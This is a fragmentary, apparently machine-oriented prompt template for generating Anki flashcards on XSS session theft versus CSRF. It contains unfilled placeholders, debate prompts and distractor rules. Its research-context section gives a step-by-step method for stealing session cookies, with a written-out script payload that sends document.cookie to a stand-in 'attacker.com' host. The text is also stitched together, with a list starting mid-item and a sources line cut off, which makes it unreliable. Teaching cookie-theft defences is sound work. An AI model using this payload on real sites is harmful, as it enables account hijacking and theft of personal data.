  discussion_prompt: In a debate format, argue whether XSS-based session theft is more dangerous than CSRF attacks in modern
    web apps. Use real-world examples like the 2018 British Airways Magecart breach (XSS supply chain attack). Divide into
    groups to present pros/cons, then vote on the most critical threat and discuss tailored prevention strategies.
  peer_teaching: Explain the key concepts to a partner without using technical jargon.
  problem_solving: Given a scenario, apply the framework to solve the problem.

    attacks (e.g., SQLi payload for XSS, CSRF for session theft). 2. Partial truths (e.g., wrong flag: ''Secure'' instead
    of ''HttpOnly''). 3. Outdated/irrelevant info (e.g., ''Use MD5 hashing'' vs modern flags). Ensure 1 correct answer is
    obviously best but requires understanding.'

  Generate 50 high-quality flashcards (mix: 20% basic/cloze for remember/understand, 30% MCQ for apply/analyze, 50% advanced
  MCQ/cloze for evaluate/create) optimized for Anki/Spaced Repetition. Cover ALL elements below:


  **Learning Objectives:** [Paste the full array from ''learning_objectives'']


  **Active Learning:** Integrate ties in explanations: [Paste full ''active_learning'']


  **Scaffolding Layers:** Distribute flashcards evenly (12-13 per layer): [Paste full ''scaffolding_layers'']


  **Research Context:** [Paste full provided research context, completed as follows:]

  XSS-based Session Theft: How it Works (6 steps): 1. Identify XSS vuln (e.g., reflected in search). 2. Craft JS payload (e.g.,
  <script>fetch(''http://attacker.com?''+document.cookie)</script>). 3. Trick victim to trigger (phish/email). 4. Victim browser
  executes JS. 5. Steals/exfils session cookie to attacker server. 6. Attacker injects cookie to hijack. Risks: Account takeover,
  PII theft. Prevention: HttpOnly/Secure/SameSite cookies, sanitize inputs (OWASP ESAPI), CSP, HSTS. Detection: WAF logs,
  anomaly detection. Tools: Burp Suite, XSStrike, BeEF. Sources: sentinelone.com/cybersecurity-101/cross-site-scripting, splunk.com/blog/learn/xss-attacks,

  **Voter Consensus (82.9% approval):** Emphasize completeness (full how-to, prevention), pedagogy (Bloom''s, activities),
  concept map in Layer 2.


  **Output EXACTLY as JSON array per Flashcard Schema:** [Paste full ''flashcard_schema'']. No extra text. Ensure variety,
  no duplicates, progressive difficulty.'
